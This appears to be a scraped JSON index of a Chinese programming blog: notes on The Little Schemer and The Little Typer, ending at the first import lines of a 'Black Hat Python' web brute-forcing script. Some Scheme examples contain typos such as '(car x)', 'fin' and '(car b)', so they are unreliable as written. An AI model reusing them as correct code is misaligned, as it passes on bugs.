List，其實就是樹。\n與List of Atom不同的是Atom沒有不同的case要處理但是List有兩種case要處理!!\n因此List of List的程式還要看第一個東西是不是List\n(define (&lt;func-name&gt; l ...)  (if (null? l)    &lt;when l is () &gt;    (if (atom? (car l))      &lt;when (car l) is atom&gt;      &lt;when (car l) is list&gt;)))\n所以從上面的三個模板可以看到，遞迴程式的骨架，是與資料結構的定義綁在一起的。\n接著來看怎麼重組資料，像同樣對List of Atom做遞迴可以有\n\n吃 List of Atom 回傳 該List長度 的 length\n吃 List of Atom 與 某個Atom 回傳 移除該Atom的List of Atom 的 rember\n\n找著前面的List of Atom模板，可以快速寫出\n(define (length l)  (if (null? l)    ...    ...))(define (rember l x)  (if (null? l)    ...    ...))\nlength的回傳值是Integer，所以一定會用到建構Integer的工具，\n0就是建構零這個case的工具，另一個case就是用add1。\nrember的List of Atom，有兩種case，空是()，前面有東西是(cons x &lt;sub-list&gt;)。\n所以上面兩個程式寫成\n(define (length l)  (if (null? l)    0    (add1 ...)))(define (rember l x)  (if (null? l)    &#x27;()    (if (eq? x (car x)) ;; 第一項是不是x        ...        (cons (car l) ...))))\n接著剩下的部分要填什麼?\n遞迴的時候!!\n(define (length l)  (if (null? l)    0    (add1 (length (cdr l)))))(define (rember l x)  (if (null? l)    &#x27;()    (if (eq? x (car x)) ;; 第一項是不是x        (rember (cdr l) x)        (cons (car l) (rember (cdr l) x)))))\n基本上，遞迴只要確定要遞迴的資料結構，就很簡單。\n依據輸入的資料結構分解，依循回傳的資料結構建構資料。\n但是還是有一些奇耙的遞迴，像河內塔與阿克曼函數。\n本書介紹的遞迴都是原始遞迴函數(primitive recursive function)。\n也就是說，每次遞迴時只有一個參數與遞迴有關，同時參數只縮小一個單位，其他參數保持不變。\n像斐波那契就不是原始遞迴函數，詳細的可以去這裡看。\nequal? &amp; s-exp\n來試著寫寫相等吧，先從Atom開始。\n(define (eqAtom? a b)  (cond    [(and (number? a) (number? b)) (= a b)] ;; 都是數字用 =    [(or (number? a) (number? b)) #f] ;; 連type都不一樣就一定不一樣    [else (eq? a b)])) ;; 都是symbol用eq?\n接著寫List of List的。\n先把所有可能性列出來\n3*3 = 9\n3是List of List的case數\n(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(and (null? a) (atom? (car b))) ;; !!      #f]    [(null? a) ;; !!      #f]    [(and (atom? (car a)) (null? b))      #f]    [(and (atom? (car a)) (atom? (car b)))      (and (eqAtom? (car a) (car b))           (eqList? (cdr a) (cdr b)))]    [(atom? (car a))      #f]    [(null? b)      #f]    [(atom? (car b)))      #f]    [else      (and (eqList? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))\n只要有(null? a)就是錯，所以可以合起來，讓下面的吃掉上面的，\n因為下面的可以cover上面的情形。\n(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(null? a) ;; !!1      #f]    [(and (atom? (car a)) (null? b))      #f]    [(and (atom? (car a)) (atom? (car b)))      (and (eqAtom? (car a) (car b))           (eqList? (cdr a) (cdr b)))]    [(atom? (car a)) ;; !! 2      #f]    [(null? b) ;; !!1      #f]    [(atom? (car b))) ;; !!2      #f]    [else      (and (eqList? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))\n回答都是錯，同時條件之間，不會互相影響，在and後做都ok，\n所以用or合起來。\n(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(or (null? a) (null? b))      #f]    [(and (atom? (car a)) (null? b)) ;; !!      #f]    [(and (atom? (car a)) (atom? (car b)))      (and (eqAtom? (car a) (car b))           (eqList? (cdr a) (cdr b)))]    [(or (atom? (car a)) (atom? (car b))))      #f]    [else      (and (eqList? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))\n過了第2條式子，代表a與b皆不為空，在後面的式子與檢查a或b是空的都沒有用。\n可以刪掉。\n(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(or (null? a) (null? b))      #f]    [(and (atom? (car a)) (atom? (car b)))      (and (eqAtom? (car a) (car b))           (eqList? (cdr a) (car b)))]    [(or (atom? (car a)) (atom? (car b)))      #f]    [else      (and (eqList? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))\n其實寫的時候要遵照，先and再or，從最小的case開始到後面的case，\n就可以直接寫出最終版了。\n接著寫個萬用的equal?\n(define (equal? a b)  (cond\t  [(and (atom? a) (atom? b))      (eqAtom? a b)]\t  [(or (atom? a) (atom? b))      #f]\t  [else      (eqList? a b)]))\n先把相關的程式列出來看看。\n(define (eqAtom? a b)  (cond    [(and (number? a) (number? b))      (= a b)]    [(or (number? a) (number? b))      #f]    [else      (eq? a b)]))(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(or (null? a) (null? b))      #f]    [(and (atom? (car a)) (atom? (car b))) ;; !!      (and (eqAtom? (car a) (car b))           (eqList? (cdr a) (car b)))]    [(or (atom? (car a)) (atom? (car b))) ;; !!      #f]    [else      (and (eqList? (car a) (car b)) ;; !!           (eqList? (cdr a) (cdr b)))]))(define (equal? a b)  (cond\t  [(and (atom? a) (atom? b)) ;; !!      (eqAtom? a b)]\t  [(or (atom? a) (atom? b)) ;; !!      #f]\t  [else      (eqList? a b)])) ;; !!\neqList?與equal?的後三條式子好像!!\n有沒有辦法用equal?來縮減eqList??\n如果用equal?先求(car a)是否等於(car b)的話…\n(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(or (null? a) (null? b))      #f]    [else      (and (equal? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))(define (equal? a b)  (cond\t  [(and (atom? a) (atom? b))      (eqAtom? a b)]\t  [(or (atom? a) (atom? b))      #f]\t  [else      (eqList? a b)]))\n最後，再把所有式子列出來吧。\n(define (eqAtom? a b)  (cond    [(and (number? a) (number? b))      (= a b)]    [(or (number? a) (number? b))      #f]    [else      (eq? a b)]))(define (eqList? a b)  (cond    [(and (null? a) (null? b))      #t]    [(or (null? a) (null? b))      #f]    [else      (and (equal? (car a) (car b))           (eqList? (cdr a) (cdr b)))]))(define (equal? a b)  (cond\t  [(and (atom? a) (atom? b))      (eqAtom? a b)]\t  [(or (atom? a) (atom? b))      #f]\t  [else      (eqList? a b)]))\n到這裡就可以看出Lisp的s-exp的定義了。\n\nS-Exp\n\nAtom\n\nNumber\nSymbol\n\n\nList\n\nNull\nCons  List\n\n\n\n\n\nfirst-class function &amp; CPS\n一級函數可以捕捉變數，與當成資料丟來丟去，所以可以用它來做一些噁心的事。\n像我們可以試著替下面這個函數加入C語言中的return\n(define (sum l)  (if (null? l)    0    (+ (car l) (sum (cdr l)))))\n0可以直接return，但是return要從哪裡來?\n我們可以多加一個參數，叫return\n(define (sum l return)  (if (null? l)    (return 0)    (return (+ (car l) (sum (cdr l))))))\n等等，(sum (cdr l))是不是少了一個參數，要給他什麼?\n痾…，直接傳入return?\n但是這樣接不起來…\n(return 0)應該要回到，(+ (car l) 0)才對\n所以(return 0)的return應該是\n(lambda (n)  (+ (car l) n))\n這個加總應該要return才對，所以再改成\n(lambda (n)  (return (+ (car l) n)))\n可以回到原本的sum了\n(define (sum l return)  (if (null? l)    (return 0)    (return (+ (car l) (sum (cdr l)                            (lambda (n)                              (return (+ (car l) n))))))))\n痾…，那個最外層的(return (+ ...))不是在lambda中嗎\n應該要刪掉吧\n(define (sum l return)  (if (null? l)    (return 0)    (sum (cdr l)         (lambda (n)           (return (+ (car l) n))))))\n這個就是cps版本的sum，觀察這個程式會發現\n\n他從遞迴變成迴圈了\n每過一次迴圈，return會變多變長，所以\n雖然說是迴圈，但是遞迴的成本還在\n這return是函數，所以應該可以有(回傳)多個參數\n\n像是說再sum中加入看有沒有0的功能\n(define (sum l return)  (if (null? l)    (return 0 #f)    (sum (cdr l)         (lambda (n z)           (return (+ (car l) n) (or (zero? (car l)) z))))))\n完成了cps版本的程式，那有沒有辦法直接轉出cps的作法?\n先看無cps與cps的對比\n(define (sum l)  (if (null? l)    0    (+ (car l) (sum (cdr l)))))(define (sum l return)  (if (null? l)    (return 0)    (sum (cdr l)         (lambda (n)           (return (+ (car l) n))))))\n看到參數列，他多了return\n看到base case，直接調用return\n看到inductive case，\n\n遞迴的部分被拉出來了\n跳回來要做的事，被放到lambda中\n在lambda因為完成了計算，所以調用了return\n\n根據剛剛的觀察，我們可以找到手工轉cps的方法\n\n參數列加入return\nbase case直接調用return\n把遞迴的部分拉到最外面\n在lambda完成原本跳回來的計算，並調用return\n\n來試試轉fib吧\n(define (fib n)  (if (&lt; n 2)    1    (+ (fib (- n 1)) (fib (- n 2)))))\n先加return與base case調用return\n(define (fib n return)  (if (&lt; n 2)    (return 1)    (+ (fib (- n 1)) (fib (- n 2)))))\n接著要把遞迴拉出來，但是這有兩個遞迴，要怎麼辦?\n如果用C語言來寫原本的fib可以寫成\nint fib(int n) &#123;  if(n &lt; 2)    return 1;  else &#123;    int tmp1 = fin(n-1);    int tmp2 = fib(n-2);    return tmp1 + tmp2;  &#125;&#125;\n所以我們應該也可以像tmp1與tmp2一樣，一次處理一個，在最後再調用return\n(define (fib n return)  (if (&lt; n 2)    (return 1)    (fin (- n 1)         (lambda (tmp1)            (fib (- n 2)                 (lambda (tmp2)                    (return (+ tmp1 tmp2))))))))\n應該要修修前面的手工方法\n\n參數列加入return\nbase case直接調用return\n一次把一個遞迴的部分拉到最外面\n在lambda完成原本跳回來的計算，並調用return\n\n到這裡終於可以來說明什麼是cps了!!\ncps是continuation-passing-style的簡稱。\ncontinuation中文叫延續。\n雖然上面都是用return來代稱，但是continuation能做的事不只是return而已。\ncontinuation可以想像成代辦事項或是Program conuter，也許會比較好思考一點。\n如果改變continuation的內容，可以讓原本的程式跑去做別的事，一去不復返，或是再回來同一個地方。\n可以用continuation實現像prolog的DSL、exception的catch-throw與簡單的thread等神奇的應用。\n有機會可以等The Seasoned Schemer的心得寫完，來整理continuation的應用與在邏輯上的意義。\n題外話，其實再多一點推導，可以推出continuation的monad，但是monad的推導與整理，也是之後再拉一篇文章來寫。\nTODO\nY combinator的CPS版是?\nY combinator\n我們從sum開始\n(define sum  (lambda (l)    (if (null? l)      0      (+ (car l) (sum (cdr l))))))\n假設我們沒有define來做遞迴了，但是要做出sum的效果。\n可以多加一層來引入能做出sum效果的函數\n(define sum-cant-work  (lambda (sum1)    (lambda (l)      (if (null? l)        0        (+ (car l) (sum1 (cdr l)))))))\n那原本的sum要給什麼，不然不會動\n把整個lambda再丟到，sum的參數中就可以用了\n(define sum-still-cant-work  ((lambda (sum1)    (lambda (l)      (if (null? l)        0        (+ (car l) (sum1 (cdr l))))))  ;; sum1需要sum1!!  (lambda (sum1)    (lambda (l)      (if (null? l)        0        (+ (car l) (sum1 (cdr l)))))))) ;; sum1需要sum1!!\n等等還是不能動，看到遞迴的sum，應該要先把sum1丟到sum1中\n(define sum-can-work-but-ugly  ((lambda (sum1)    (lambda (l)      (if (null? l)        0        (+ (car l) ((sum1 sum1) (cdr l))))))  (lambda (sum1)    (lambda (l)      (if (null? l)        0        (+ (car l) ((sum1 sum1) (cdr l))))))))\n好醜，抽象重複的部分\n(define sum-can-work-but-wierd  ((lambda (mk)    (mk mk))   (lambda (sum1)     (lambda (l)       (if (null? l)        0        (+ (car l) ((sum1 sum1) (cdr l)))))))) ;; (sum1 sum1) 能不能改成 像 sum 這樣\n現在就是(sum1 sum1)怪怪的\n能不能把他抽掉嗎?\n(define sum-can-work  ((lambda (mk)    (mk mk))   (lambda (sum1)    ((lambda (sum)                   ;; 從這裡到 ...      (lambda (l)       (if (null? l)        0        (+ (car l) (sum (cdr l)))))) ;; 這裡與原本的sum好像     (lambda (arg) ((sum1 sum1) arg)))))\nsum好像浮出來了\n試著把他拉出去\n(define sum-mk  (lambda (sum)      (lambda (l)       (if (null? l)        0        (+ (car l) (sum (cdr l)))))))(define sum-can-work  (lambda (sum-mk)    ((lambda (mk)      (mk mk))     (lambda (sum1)      (sum-mk        (lambda (arg) ((sum1 sum1) arg)))))))\n這sum-can-work好像可以產生sum以外的遞迴函數，應該換個名字\n(define Y  (lambda (mk)    ((lambda (f)      (f f))     (lambda (g)      (mk        (lambda (arg) ((g g) arg)))))))\n這就是Y combinator嚴格求值版。\n還有惰性求值版與set!版。\nset!版在The Seasoned Schemer有介紹，而惰性求值版之後會在Y combinator的專文中補完。\n略過的部分\n\n直譯器\nset &amp; relation\n停機問題\n直譯器等到以後打EoPL與LiSP的心得再說。\nset與relation的部分直接去看就好。\n停機問題等摸熟計算理論再說吧。\n\n","categories":["Lisp","Reading"]},{"title":"little typer 後篇(8~16) 整理與筆記","url":"/2020/5/little-typer-8-16/","content":"來證明啦\n\nch8 &amp; ch9 &amp; ch10 &amp; ch11\n現在說用type證明，但實際上怎麼做?\n在claim寫下想證的東西，在define證出來\nincr &amp; +\n(claim incr  (-&gt; Nat Nat))(define incr  (λ (n)    (iter-Nat n      1      (+ 1))))(claim +  (-&gt; Nat Nat Nat))(define +  (λ (a b)    (iter-Nat a      b      (λ (ret)        (add1 ret)))))\n+1=add1\n證對於任何整數，add1等於+1\n(claim +1=add1  (Pi ((n Nat))    (= Nat (+ 1 n) (add1 n))))\n所以我們需要一個value的type是(= Nat (+ 1 n) (add1 n)))\n先把1帶入+中，會發現根本就是(add1 n)\n也就是兩邊都一樣，same!!\n(define +1=add1  (λ (n)    (same (+ 1 n))))\nincr=add1\n同樣的來試試incr=add1\n(claim incr=add1  (Pi ((a Nat))    (= Nat (incr a) (add1 a))))\n直接帶入沒有像+1=add1之類的好事，只能用歸納法了\n這裡對n做歸納\n這裡motive與base都很好懂，那step呢?\n同樣展開incr，會發現(incr n) =&gt; (+ 1 n-1)\n而另一邊是add1，其實就是(+ 1 n-1)\n歸納法會回傳n-1的證明，那我們只要把它擴充成n的就好了\n把n-1的兩邊同時(+ 1)，cong\n(define incr=add1  (λ (n)    (ind-Nat n      (λ (a) (= Nat (incr a) (add1 a)))      (same 1)      (λ (n-1)        (λ (prev)          (cong prev (+ 1)))))))\nreplace\n雖然說incr=add1證好了，但這邊要介紹另一個工具來改寫一部份的type\n歸納法會回傳n-1的證明(prev,(= (incr n-1) (add1 n-1)))，而我們要的證明是(= (add1 (incr n-1)) (add1 (add1 n-1)))，那利用prev去改寫\n嗎?\n把prev看成(incr n-1)可以變成(add1 n-1)，就可以用replace把出現(incr n-1)換成(add1 n-1)\n所以用(same (add1 (incr n-1)))，就有空間去換!!\n(define incr=add1  (λ (n)    (ind-Nat n      (λ (a) (= Nat (incr a) (add1 a)))      (same 1)      (λ (n-1)        (λ (prev)          (replace prev            (λ (k) (= Nat (add1 (incr n-1)) (add1 k))) ;; 這裡k就是要換的部分，當成挖空            (same (add1 (incr n-1)))))))))\ntwice=double\n(claim twice  (-&gt; Nat Nat))(define twice  (λ (n)    (+ n n)))(claim double  (-&gt; Nat Nat))(define double  (λ (n)    (iter-Nat n      0      (λ (ret)        (+ 2 ret)))))(claim twice=double  (Pi ((n Nat))    (= Nat (twice n) (double n))))(define twice=double  (λ (n)    (ind-Nat n      (λ (k) (= Nat (twice k) (double k)))      (same 0)      (λ (n-1)        (λ (prev) ;; (= Nat (twice n-1) (double n-1))          TODO))))) \n在Pie可以用TODO去看現在Pie想要什麼type，會噴\n\n整理一下，其實就是\n(= Nat (add1 (+ n-1 (add1 n-1)))       (add1 (add1 (double n-1))))\nwow，我們有prev，(= Nat (+ n-1 n-1) (double n-1))，如果兩邊都變成(add1 (add1 …))的話，就能用cong了\n所以要證+add1=add1+\n+add1=add1+\n直接帶(add1 n-1)，到motive中\n(= Nat (+ (add1 (add1 n-1)) b) (+ (add1 n-1) (add1 b)))\n而我們有prev，(= Nat (+ (add1 n-1) b) (+ n-1 (add1 b)))\n把(= Nat (+ (add1 (add1 n-1)) b) (+ (add1 n-1) (add1 b)))的add1拉出來變成(= Nat (add1 (+ (add1 n-1)) b)) (add1 (+ n-1 (add1 b))))\n只與prev差add1，用cong\n(claim add1+=+add1  (Pi ((n Nat)       (b Nat))    (= Nat (+ (add1 n) b) (+ n (add1 b)))))(define add1+=+add1  (λ (n b)    (ind-Nat n      (λ (x) (= Nat (+ (add1 x) b) (+ x (add1 b))))      (same (add1 b))      (λ (n-1 prev)        (cong prev (+ 1))))))\ntwice=double with +add1=add1+\n可以回來證twice=double\n用replace把位置換過來就可以cong了\n(define twice=double  (λ (n)    (ind-Nat n      (λ (k) (= Nat (twice k) (double k)))      (same 0)      (λ (n-1)        (λ (prev)          (replace (add1+=+add1 n-1 n-1)            (λ (k)              (= Nat (add1 k) (+ 2 (double n-1))))            (cong prev (+ 2))))))))\n這裡也告訴我們位置不對是會影響證明的，下面的就是一個例子\ndouble-vec &amp; twice-vec\n(claim double-vec  (Pi ((A U)       (n Nat))    (-&gt; (Vec A n) (Vec A (double n)))))(claim mot-double-vec  (Pi ((A U)       (n Nat))    U))(define mot-double-vec  (λ (A x) (-&gt; (Vec A x) (Vec A (double x)))))(define double-vec  (λ (A n)    (ind-Nat n      (mot-double-vec A)      (λ (v) (the (Vec A 0) vecnil))      (λ (n-1 f v)        (vec:: (head v) (vec:: (head v) (f (tail v))))))))\n直接寫寫看twice-vec，但會發現ind-Nat沒辦法用，要注意到twice-vec要求的base是n!!\n用TODO會看到\ndouble-vec\n\ntwice-vec\n\n所以要寫twice-vec，可以\n用replace把double-Vec的double換成twice\n(claim twice-vec  (Pi ((A U)       (n Nat))    (-&gt; (Vec A n) (Vec A (twice n)))))(define twice-vec  (λ (A n v)    (replace (symm (twice=double n))      (λ (x) (Vec A x)) ;; 把要抽換的部分，抽象出來回傳type的函數      (double-vec A n v)))) ;; base是值!!\n用type去擋掉一些奇怪的實作\nList-&gt;Vec\n看宣告好像很合理，但實作可以亂搞\n(claim List-&gt;Vec  (Pi ((A U))    (-&gt; (List A)      (Sigma ((l Nat)) ;; Sigma是有一個的意思，所以這裡的意思是有一個nat可以滿足(vec A l)        (Vec A l)))))(define List-&gt;Vec    (λ (E)        (λ (es)            ;; Sigma的實體是list            (cons 0 vecnil)))) ;; WTF\n所以幫他加個條件，生出來的長度要與原本的一樣\n(claim List-&gt;Vec  (Pi ((A U)       (l (List A)))        (Vec A (len A l)))) ;; i am better(define List-&gt;Vec  (λ (A)    (λ (x)      (ind-List x        (λ (x) (Vec A (len A x)))        (the (Vec A 0) vecnil)        (λ (a x-1)          (λ (ret)            (vec:: a ret)))))))\n內容物不用一樣嗎? (書上其實有一個可以重複atom的function)\n所以可以再寫證明\n用證明去擋一些奇怪的實作\n這裡是用Vec-&gt;List去寫一個證明，Vec-&gt;List與List-&gt;Vec的內容物實一樣的\n(claim Vec-&gt;List  (Pi ((A U)       (n Nat))    (-&gt; (Vec A n) (List A))))(define Vec-&gt;List  (λ (A n v)    (ind-Vec n v      (λ (n v) (List A))      (the (List A) nil)      (λ (n-1 a v-1 ret)        (:: a ret)))))(claim Vec-&gt;List=List-&gt;Vec  (Pi ((A U)       (l (List A)))    (= (List A) l (Vec-&gt;List A (len A l) (List-&gt;Vec A l)))))(define Vec-&gt;List=List-&gt;Vec  (λ (A l)    (ind-List l      (λ (x) (= (List A) x (Vec-&gt;List A (len A x) (List-&gt;Vec A x))))      (same nil)      (λ (a l-1 ret)        (cong ret (the (-&gt; (List A) (List A)) (λ (x) (:: a x))))))))\nch12 &amp; ch13\n數學套餐開始啦\nodd &amp; even\n(claim Even  (Pi ((n Nat))    U))(define Even  (λ (n)    (Sigma ((x Nat))           (= Nat n (double x)))))(claim Odd  (Pi ((n Nat))    U))(define Odd  (λ (n)    (Sigma ((x Nat))           (= Nat n (add1 (double x))))))\n+2=even\n(claim +2=even  (Pi ((n Nat))    (-&gt; (Even n) (Even (+ 2 n)))))(define +2=even  (λ (n eve)    (cons (+ 1 (car eve)) (cong (cdr eve) (+ 2))))) ;;這邊不用用到歸納法，因為我們已經有 (Even n) 了!!\nadd1-even-&gt;odd\n(claim add1-even-&gt;odd  (Pi ((n Nat))    (-&gt; (Even n) (Odd (add1 n)))))(define add1-even-&gt;odd  (λ (n eve)    ;; (Even 10) =&gt; (5 (same 10))    ;; (Odd 11)  =&gt; (5 (same 11))    (cons (car eve) (cong (cdr eve) (+ 1)))))\nadd1-odd-&gt;even\n(claim add1-odd-&gt;even  (Pi ((n Nat))    (-&gt; (Odd n) (Even (add1 n)))))(define add1-odd-&gt;even  (λ (n eve)    ;; (Odd 11)  =&gt; (5 (same 11))    ;; (Even 12) =&gt; (6 (same 12))    (cons (add1 (car eve)) (cong (cdr eve) (+ 1)))))\nackermann function\n(claim rep  (-&gt; (-&gt; Nat Nat) Nat Nat))(define rep  (λ (f n)    (iter-Nat n      (f 1)      (λ (ret)        (f ret)))));; (rep f 5) =&gt; (f (f (f (f (f 1)))))(claim ackermann  (-&gt; Nat Nat Nat))(define ackermann  (λ (n)    (iter-Nat n      (+ 1)      (λ (ret)        (rep ret)))))\nEven-or-Odd\n這裡用到ind-Either，Either是一種type，它只有兩種constructor，left與right\nind-Either，就只處理兩種case，left與right剩下就是motive\n(claim Even-or-Odd  (Pi ((n Nat))    (Either (Even n) (Odd n))))(define Even-or-Odd  (λ (n)    (ind-Nat n      (λ (x) (Either (Even x) (Odd x)))      (left (the (Even 0) (cons 0 (same 0))))      (λ (n-1)        (λ (ret)          (ind-Either ret            (λ (e) (Either (Even (add1 n-1)) (Odd (add1 n-1))))            (λ (left-val)  (right (add1-even-&gt;odd n-1 left-val)))            (λ (right-val) (left  (add1-odd-&gt;even n-1 right-val)))))))))\nch14 &amp; ch15 &amp; ch16\n也有數學套餐，但多Absurd與bem與deciable了!!\nMaybe\n(claim Maybe  (-&gt; U U))(define Maybe  (-&gt; A (Either A Trivial)))(claim Nothing  (Pi ((A U))    (Maybe A)))(define Nothing  (λ (A)    (right sole)))(claim Just  (Pi ((A U)       (a A))    (Maybe A)))(define Just  (λ (A a)    (left a)))\nmaybe-head &amp; maybe-tail\n(claim maybe-head  (Pi ((A U)       (l (List A)))    (Maybe A)))(define maybe-head  (λ (A l)    (rec-List l      (Nothing A)      (λ (a l-1 ret)        (Just A a)))))(claim maybe-tail  (Pi ((A U)       (l (List A)))    (Maybe (List A))))(define maybe-tail  (λ (A l)    (rec-List l      (Nothing (List A))      (λ (a l-1 ret)        (Just (List A) l-1)))))\nlist-ref\n(claim list-ref  (Pi ((A U)       (i Nat)       (l (List A)))    (Maybe A)))(define list-ref  (λ (A i)    (rec-Nat i      (maybe-head A)      (λ (i-1)        (λ (ret)          (λ (l)            (ind-Either (maybe-tail A l)              (λ (x) (Maybe A))              (λ (lhs) (ret lhs))              (λ (rhs) (Nothing A)))))))))\nAbsurd!!\n這個要給多一點尊重\nAbsurd是type但沒有任何值 (WTF)\n但是有eliminator (WTF)\neliminate後可以生出任何值 (WTF)\n\nIf a false statement were true, then we might as well say anything at all.\n(the Principle of Explosion or ex falso quodlibet, which means “from false, anything.”)\n\nQ: 如果沒有值怎麼eliminate?\nA: 假裝有 (從lambda的參數來)\n(λ (1=6) ;; WTF  (ind-Absurd 1=6      &#123;return type&#125;))\n所以Not就是(-&gt; X Absurd)，也就是X只能推出Absurd，什麼都沒有，也就是沒有證明\nvec-ref\n這個十分複雜，看不懂沒差，但說說大該是怎麼做的\n用Fin去控制vec要不要繼續往下走，看ind-Ether\n如果真的走到空(base case)，用ind-Absurd把Absurd劃掉(這樣就是total function了)\n(vec-ref Nat 4 (fzero 3) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil)))));; (the Nat 1) (vec-ref Nat 4 (fadd1 3 (fzero 2)) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil)))));; (the Nat 2)(vec-ref Nat 4 (fadd1 3 (fadd1 2 (fzero 1))) (vec:: 1 (vec:: 2 (vec:: 3 (vec:: 4 vecnil)))));; (the Nat 3)\n把fadd1與fzero看成tail與head，所以vec-ref的任務是把一連串fadd1與fzero用成tail與head在Vec上跑\n(claim Fin  (-&gt; Nat U))(define Fin  (λ (n)    (iter-Nat n      Absurd      (λ (ret)        (Maybe ret)))));; 每一個Maybe會分岔出Nothing，所以在iter時都有機會可以到base case(claim fzero  (Pi ((n Nat))    (Fin (add1 n))))(define fzero  (λ (n)    (Nothing (Fin n))))(claim fadd1  (Pi ((n Nat))    (-&gt; (Fin n) (Fin (add1 n)))))(define fadd1  (λ (n fin)    (Just (Fin n) fin)))(define vec-ref  (λ (A i)    (ind-Nat i      (λ (k) (-&gt; (Fin k) (Vec A k) A))      (λ (fin v)        (ind-Absurd fin          A))      (λ (i-1)        (λ (ret)          (λ (fin v)            (ind-Either fin              (λ (k) A)              (λ (lhs)                (ret lhs (tail v)))              (λ (rhs)                (head v)))))))))\n=consequence\n\n\n\n\n0\n(add1 j-1)\n\n\n\n\n0\nTrivial\nAbsurd\n\n\n(add1 n-1)\nAbsurd\n(= Nat (add1 n-1) (add1 j-1))\n\n\n\n(claim =cases  (-&gt; Nat Nat U)) ;; U 就是兩個比較後，可以知道什麼(define =cases  (λ (a b)    (which-Nat a      (which-Nat b        Trivial           ;; 0 = 0 is trivial        (λ (b-1) Absurd)) ;; 0 = other Nat is Absurd      (λ (a-1)        (which-Nat b          Absurd          ;; other = 0 Nat is Absurd          (λ (b-1)            (= Nat a-1 b-1))))))) ;;(claim =cases-same  (Pi ((a Nat))    (=cases a a)))(define =cases-same  (λ (a)    (ind-Nat a      (λ (x) (=cases x x))      sole      (λ (a-1)        (λ (ret)          (same a-1))))))\nuse-Nat= : 生 Not 的函數\n(claim use-Nat=  (Pi ((a Nat)       (b Nat))    (-&gt; (= Nat a b) (=cases a b))))(define use-Nat=  (λ (a b)    (λ (a=b)  (replace a=b ;; 不管是不是真的有就先replace =cases出來的值就對了，        (λ (x) (=cases a x))        (=cases-same a)))))(claim 0!=n+1  (Pi ((n Nat))    (-&gt; (= Nat 0 (add1 n)) Absurd)))(define 0!=n+1  (λ (n)    (use-Nat= 0 (add1 n))))\n\n1-!=-6\n(claim dount-absurdity  (-&gt; (= Nat 0 6) (= Atom &#x27;hi &#x27;wow)))(define dount-absurdity  (λ (0=6)    (ind-Absurd (0!=n+1 5 0=6)      (= Atom &#x27;hi &#x27;wow))))(claim sub1=  (Pi ((n Nat)       (j Nat))    (-&gt; (= Nat (add1 n) (add1 j))        (= Nat n j))))(define sub1=  (λ (n j)    ;; (= Nat (add1 n) (add1 j)) 在 =cases 有!!    ;; 而 use-Nat= 可以生出 =cases    (use-Nat= (add1 n) (add1 j))))(claim 1-!=-6  (-&gt; (= Nat 1 6) Absurd))(define 1-!=-6  (λ (1=6) ;; 這裡就是假設有1=6這東西的地方(歸謬法)    ((use-Nat= 0 5) ((sub1= 0 5) 1=6))))\nfront\n(claim front  (Pi ((A U)       (n Nat))    (-&gt; (Vec A (add1 n)) A))) ;; 這邊無法寫成(-&gt; (Vec A n) A))，因為有要求證明(= Nat n (add1 l))，會強迫把claim改成(-&gt; (Vec A (add1 n)) A)))(define front  (λ (A n)    (λ (v)      ((ind-Vec (add1 n) v         (λ (n v)           (Pi ((l Nat))             (-&gt; (= Nat n (add1 l)) A))) ;; 要求當前的n必須至少大於1(是某個有1的數字)           (λ (l)             (λ (0=otherNat)               (ind-Absurd (0!=n+1 l 0=otherNat) ;; 假設有0=otherNat的proof，來拉出Absurd                 A)))         (λ (n a v-1)           (λ (ret)             (λ (l proofWhichWeDontNeed)               a))))        n (same (add1 n))))))\n排中律(pem，principle excluded middle)\n\n沒有直接的proof說他是對的或錯的\n但我們可證明pem不是不對的\n當初用natural deduction在那邊想很久也沒寫出來，看了解答也是wtf(疑惑)\n如今看這個也是wtf(讚嘆)\n(claim pem-not-false  (Pi ((A U))    (-&gt; (-&gt; (Either A (-&gt; A Absurd))            Absurd)        Absurd)))(define pem-not-false  (λ (A)    (λ (!PEM)      (!PEM (right ;; (1) ??              (λ (a) ;; WTF 幹，我們有A的value了                ;; 教訓: 要有function type才有相對應的值                ;; 值的產生方式: 1. 直接造 2. 從function拉出來 (而function也是值，所以也可以直接造或從function拉出來)                (!PEM (left a))))))))\ndecidable : function that decides whether they are true or false\n(claim Dec  (-&gt; U U))(define Dec  (λ (X)    (Either X (-&gt; X Absurd))))(claim zero?  (Pi ((n Nat))    (Dec (= Nat 0 n))))(define zero?  (λ (n)    (ind-Nat n      (λ (x) (Dec (= Nat 0 x)))      (left (same 0))      (λ (n-1)        (λ (ret)          (right            (0!=n+1 n-1)))))))\nnat=?\n(claim ?orez  (Pi ((n Nat))    (Dec (= Nat n 0))))(define ?orez  (λ (n)    (ind-Nat n      (λ (x) (Dec (= Nat x 0)))      (left (same 0))      (λ (n-1)        (λ (ret)          (right            (n+1!=0 n-1)))))))(claim nat=?  (Pi ((a Nat)       (b Nat))    (Dec (= Nat a b))))(define nat=?  (λ (a b)    ((ind-Nat a       (λ (k) (Pi ((x Nat))                (Dec (= Nat k x))))       (λ (j) (zero? j))       (λ (a-1)         (λ (ret)           (λ (j)             (ind-Nat j               (λ (k) (Dec (= Nat (add1 a-1) k)))               (?orez (add1 a-1))               (λ (j-1)                 (λ (ret2)                   (ind-Either (ret j-1)                     (λ (x) (Dec (= Nat (add1 a-1) (add1 j-1))))                     (λ (lhs) (left (cong lhs (+ 1))))                     (λ (rhs) (right (λ (a=j)                                       (rhs (sub1= a-1 j-1 a=j)))))))))))))      b)))\nTODO\n\nThe Way Forward\nRules are made to be spoken\n\n等看過了\nPractical Foundations for Programming Languages,\nTypes and Programming Languages,\nSemantics Engineering with PLT Redex. &lt;= Prefer this\n其中一本再說\n","categories":["Lisp","Reading"]},{"title":"blackhat python - web","url":"/2020/9/python-black-hat-web/","content":"動機\n這邊主要是處理http與web的html\n還有網站結構\n\nCH5\ncontent_bruter.py\nimport queueimport threadingimport urllib.errorimport urllib.parseimport 